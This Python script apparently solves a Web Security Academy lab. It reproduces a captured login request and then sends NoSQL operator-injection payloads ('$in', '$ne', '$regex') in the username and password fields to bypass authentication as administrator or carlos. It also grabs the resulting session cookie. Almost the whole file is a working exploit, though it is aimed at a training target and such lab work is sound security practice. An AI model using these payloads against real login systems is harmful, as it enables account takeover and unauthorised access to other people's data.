"""
POST /login HTTP/2
Host: 0a690038031df19b82b706ac00160044.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a690038031df19b82b706ac00160044.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0a690038031df19b82b706ac00160044.web-security-academy.net
Connection: keep-alive
Cookie: session=W8E8Bnj7ksL12S8s1tdyYrUH3ZmZxFIv
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
TE: trailers

{"username":"wiener","password":"peter"}
"""

import requests

DOMAIN = "0a690038031df19b82b706ac00160044.web-security-academy.net"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/login",
    "Content-Type": "application/json",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Cookie": "session=",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

def login(username, password):

    json_data = "{" + f'"username":{username},"password":{password}' + "} "

    response = requests.post(f"https://{DOMAIN}/login", headers=HEADERS, data=json_data, allow_redirects=False)

    if response.status_code == 302:
        print(f"Logged in as {username} with password {password}")
        HEADERS["Cookie"] = response.headers["Set-Cookie"].split(";")[0]
        print(HEADERS["Cookie"])
    else:
        print(response.text)

# login('wiener', 'peter')
# login('{"$in": ["administrator"]}', '{"$ne": ""}')
# login('{"$in": ["carlos"]}', '{"$ne": ""}')
login('{"$regex": "admin.*"}', '{"$ne":"invalid"}')